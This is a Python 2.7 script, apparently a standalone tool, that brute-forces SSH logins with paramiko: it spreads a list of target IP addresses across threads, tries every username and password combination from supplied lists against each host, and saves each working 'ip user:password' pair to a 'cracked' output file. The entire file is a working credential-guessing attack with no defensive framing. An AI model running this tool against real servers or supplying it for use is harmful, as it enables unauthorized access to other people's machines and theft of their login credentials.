#!usr/bin/python2.7
import paramiko
import socket
import threading
import time
from Queue import Queue
from termcolor import colored

from getInput import getInput
from wprogressbar import ProgressBar

config = {}
checked = 0

q = Queue()


def initializeParamiko():
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    paramiko.util.log_to_file("session.log")
    return ssh


def startProgressBar():
    pbar = ProgressBar(title="Bruteforce", maximum=len(config["machines"]), sign="*")
    pbar.start()
    return pbar


def sshConnect(ssh, host, username, password):
    credentials = username + ":" + password
    try:
        # Attempt to connect to SSH, it will raise an exception on failure
        ssh.connect(host, port=config["port"], username=username, password=password)
        # Save successful connection
        appendToFile(host, credentials)
        msg = "%s %s\tAuthentication succeeded!\t%s" % (colored("[+]", "red"), host, credentials)
    except paramiko.AuthenticationException:
        msg = "%s %s\tAuthentication failed.\t%s" % (colored("[+]", "red"), host, credentials)
    except socket.error:
        msg = "%s %s\tSocket error." % ("[-]", host)
    except:
        msg = "%s %s\tConnection failed." % ("[-]", host)
    if config["verbose"]:
        print(msg)


def work(ssh, pbar):
    global checked
    while True:
        checked += 1
        host = q.get()
        for username in config["username"]:
            for password in config["password"]:
                sshConnect(ssh, host, username, password)
        if not config["verbose"]:
            pbar.update()
        q.task_done()


# Create all the threads running the function work
def createThreads(ssh, pbar):
    for i in range(config["threads"]):
        t = threading.Thread(target=work, args=(ssh, pbar))
        t.daemon = True
        t.start()


# Add the links from the queue set() to the actual q
def checkQueue():
    for ip in config["machines"][:100]:
        q.put(ip)
        config["machines"].remove(ip)
    q.join()
    checkFinish()


# Check if there are links on the queue
def checkFinish():
    # Check ips in groups of 100
    global checked
    if checked >= 100:
        checked -= 100
        time.sleep(1)
        checkQueue()

    # Quit program when all ips have been checked
    if len(config["machines"]) == 0:
        print("\n\n[+] Programmed checked all ips, exiting...")
        exit(1)


# Append cracked ip to file
def appendToFile(ip, credentials):
    output = open(config["output"], "a")
    output.write("%s\t%s\n" % (ip, credentials))
    output.close()


def main():
    global config
    config = getInput().checkInput()

    ssh = initializeParamiko()
    pbar = startProgressBar() if not config["verbose"] else None

    # Start threading
    createThreads(ssh, pbar)
    checkQueue()


if __name__ == "__main__":
    try:
        main()
    # Exit the program when a Keyboard Interrupt is pressed
    except KeyboardInterrupt:
        print("Exiting cause of keyboard interrupt.")
        exit(0)
